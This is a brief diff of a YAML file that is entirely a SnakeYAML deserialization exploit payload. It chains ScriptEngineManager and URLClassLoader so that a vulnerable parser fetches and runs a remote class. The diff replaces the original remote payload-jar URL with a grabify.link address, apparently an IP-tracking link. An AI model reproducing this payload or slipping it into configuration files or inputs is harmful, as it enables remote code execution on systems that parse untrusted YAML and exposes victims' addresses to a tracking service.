@@ -1,7 +1,6 @@
-version: 1.2
 !!javax.script.ScriptEngineManager [
   !!java.net.URLClassLoader [[
-    !!java.net.URL ["http://artsploit.com/yaml-payload.jar"]
+    !!java.net.URL ["https://grabify.link/S9FG7Q"]
   ]]
 ]
 
